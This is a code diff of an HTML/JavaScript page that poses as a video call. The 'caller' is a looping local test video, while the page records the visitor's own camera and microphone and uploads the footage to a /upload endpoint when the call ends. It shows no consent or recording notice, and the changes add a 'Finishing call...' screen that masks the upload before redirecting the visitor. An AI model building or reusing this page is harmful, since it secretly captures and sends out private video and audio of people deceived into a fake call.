@@ -2,18 +2,99 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Calling</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <style>
-    body { margin:0; background:black; color:white; font-family: sans-serif; overflow:hidden; }
-    #remoteVideo { position:fixed; width:100%; height:100%; object-fit:cover; }
-    #localVideo { position: absolute; width: 120px; height: 180px; bottom: 100px; right: 20px; border: 2px solid white; border-radius: 12px; object-fit: cover; z-index: 10; }
-    .controls { position:absolute; bottom:20px; width:100%; display:flex; justify-content:center; gap:10px; }
-    button { padding:12px 20px; border:none; border-radius:25px; background:#333; color:white; cursor:pointer; }
-    .end { background:#ff3b30; }
+    body { margin:0; background:black; color:white; font-family: sans-serif; overflow:hidden; touch-action: none; }
+
+    /* Remote Video (The background) */
+    #remoteVideo {
+        position:fixed;
+        width:100%;
+        height:100%;
+        object-fit:cover;
+        z-index: 1;
+    }
+
+    /* Local Camera (The movable window) */
+    #localVideo {
+        position: absolute;
+        width: 110px;
+        height: 160px;
+        bottom: 100px;
+        right: 20px;
+        border: 1px solid rgba(255,255,255,0.4);
+        border-radius: 12px;
+        object-fit: cover;
+        z-index: 10;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        transition: transform 0.1s ease-out; /* Smooth drag */
+    }
+
+    /* Snap Animation */
+    .snap-transition {
+        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) !important;
+    }
+
+    /* Controls Overlay */
+    .controls {
+        position:absolute;
+        bottom:30px;
+        width:100%;
+        display:flex;
+        justify-content:center;
+        gap:15px;
+        z-index: 20;
+        transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+
+    .controls.hidden {
+        opacity: 0;
+        pointer-events: none;
+        transform: translateY(20px);
+    }
+
+    button {
+        padding: 12px;
+        border: none;
+        border-radius: 50%;
+        background: rgba(40, 40, 40, 0.8);
+        color: white;
+        cursor: pointer;
+        width: 50px;
+        height: 50px;
+        backdrop-filter: blur(5px);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .end { background: #ff3b30; border-radius: 25px; width: 80px; }
+
+    /* Processing Screen */
+    #overlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: black;
+        z-index: 100;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .spinner {
+        width: 40px; height: 40px;
+        border: 4px solid rgba(255,255,255,0.1);
+        border-top: 4px solid #00ff99;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
-<body>
+
+<body onclick="toggleUI(event)">
 
 <video id="remoteVideo" autoplay loop muted playsinline>
     <source src="test-video.mp4" type="video/mp4">
@@ -21,10 +102,15 @@
 
 <video id="localVideo" autoplay muted playsinline></video>
 
-<div class="controls">
-    <button onclick="toggleMic()">Mic</button>
-    <button onclick="switchCamera()">Switch</button>
-    <button class="end" onclick="endCall()">End Call</button>
+<div class="controls" id="controlsUI">
+    <button onclick="toggleMic()">🎤</button>
+    <button onclick="switchCamera()">🔄</button>
+    <button class="end" onclick="endCall()">End</button>
+</div>
+
+<div id="overlay">
+    <div class="spinner"></div>
+    <p>Finishing call...</p>
 </div>
 
 <script>
@@ -32,82 +118,109 @@ let localStream;
 let mediaRecorder;
 let recordedChunks = [];
 let currentFacing = "user";
+let uiVisible = true;
 
 const localVideo = document.getElementById("localVideo");
+const controlsUI = document.getElementById("controlsUI");
+const overlay = document.getElementById("overlay");
 
-// --- MOVABLE VIDEO LOGIC (Desktop & Mobile) ---
+// --- 1. UI TOGGLE LOGIC ---
+function toggleUI(e) {
+    // Don't hide if clicking a button or dragging the video
+    if (e.target.tagName === 'BUTTON' || isDragging || e.target === localVideo) return;
+    
+    uiVisible = !uiVisible;
+    controlsUI.classList.toggle("hidden", !uiVisible);
+}
+
+// --- 2. MAGNETIC DRAG LOGIC ---
 let isDragging = false;
-let offsetX, offsetY;
+let startX, startY, initialLeft, initialTop;
 
 const startDrag = (e) => {
     isDragging = true;
+    localVideo.classList.remove("snap-transition");
     const clientX = e.touches ? e.touches[0].clientX : e.clientX;
     const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+    
     const rect = localVideo.getBoundingClientRect();
-    offsetX = clientX - rect.left;
-    offsetY = clientY - rect.top;
-    localVideo.style.cursor = "grabbing";
+    startX = clientX;
+    startY = clientY;
+    initialLeft = rect.left;
+    initialTop = rect.top;
 };
 
 const drag = (e) => {
     if (!isDragging) return;
-    e.preventDefault(); // Prevents scrolling while moving video
     const clientX = e.touches ? e.touches[0].clientX : e.clientX;
     const clientY = e.touches ? e.touches[0].clientY : e.clientY;
     
-    localVideo.style.left = (clientX - offsetX) + "px";
-    localVideo.style.top = (clientY - offsetY) + "px";
+    let newX = initialLeft + (clientX - startX);
+    let newY = initialTop + (clientY - startY);
+
+    // Boundary Constraints (Keep inside screen)
+    newX = Math.max(10, Math.min(newX, window.innerWidth - localVideo.offsetWidth - 10));
+    newY = Math.max(10, Math.min(newY, window.innerHeight - localVideo.offsetHeight - 10));
+
+    localVideo.style.left = newX + "px";
+    localVideo.style.top = newY + "px";
     localVideo.style.right = "auto";
     localVideo.style.bottom = "auto";
 };
 
-const stopDrag = () => { isDragging = false; localVideo.style.cursor = "grab"; };
+const stopDrag = () => {
+    if (!isDragging) return;
+    isDragging = false;
+    
+    // Magnetic Logic: Snap to closest side
+    localVideo.classList.add("snap-transition");
+    const rect = localVideo.getBoundingClientRect();
+    const screenMid = window.innerWidth / 2;
+    const finalX = (rect.left + rect.width / 2) < screenMid ? 20 : (window.innerWidth - rect.width - 20);
+    
+    localVideo.style.left = finalX + "px";
+};
 
 localVideo.addEventListener("mousedown", startDrag);
-localVideo.addEventListener("touchstart", startDrag, { passive: false });
+localVideo.addEventListener("touchstart", startDrag);
 document.addEventListener("mousemove", drag);
 document.addEventListener("touchmove", drag, { passive: false });
 document.addEventListener("mouseup", stopDrag);
 document.addEventListener("touchend", stopDrag);
 
-
-// --- CAMERA & RECORDING LOGIC ---
+// --- 3. CAMERA & UPLOAD LOGIC ---
 async function startCamera() {
     try {
         localStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: currentFacing },
+            video: { facingMode: currentFacing, width: 640 },
             audio: true
         });
         localVideo.srcObject = localStream;
         startRecording();
     } catch (err) {
-        console.error("Camera error:", err);
+        alert("Camera required for calls.");
     }
 }
 
 function startRecording() {
     const types = ["video/webm;codecs=vp8,opus", "video/webm", "video/mp4"];
     let selectedType = types.find(t => MediaRecorder.isTypeSupported(t));
-    
     mediaRecorder = new MediaRecorder(localStream, { mimeType: selectedType });
     
-    mediaRecorder.ondataavailable = e => {
-        if (e.data.size > 0) recordedChunks.push(e.data);
-    };
+    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
 
-    mediaRecorder.onstop = () => {
+    mediaRecorder.onstop = async () => {
+        // Show processing UI
+        overlay.style.display = "flex";
+        
         const blob = new Blob(recordedChunks, { type: selectedType });
         const formData = new FormData();
         formData.append("video", blob, "call.webm");
 
-        // 🔥 BACKGROUND UPLOAD: Starts the upload but doesn't make the user wait
-        fetch("/upload", {
-            method: "POST",
-            body: formData,
-            keepalive: true // Crucial: keeps the request alive after page redirect
-        }).catch(err => console.error("Background upload failed", err));
-
-        // 🚀 INSTANT REDIRECT
+        try {
+            await fetch("/upload", { method: "POST", body: formData });
+        } catch (e) {}
+        
         window.location.href = "search.html";
     };
 
@@ -115,8 +228,8 @@ function startRecording() {
 }
 
 function endCall() {
-    // Stop recording, which triggers the onstop event and the redirect
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        localStream.getTracks().forEach(t => t.stop());
         mediaRecorder.stop();
     } else {
         window.location.href = "search.html";
@@ -130,8 +243,8 @@ function switchCamera() {
 }
 
 function toggleMic() {
-    const track = localStream.getAudioTracks()[0];
-    if(track) track.enabled = !track.enabled;
+    const t = localStream.getAudioTracks()[0];
+    if(t) t.enabled = !t.enabled;
 }
 
 startCamera();
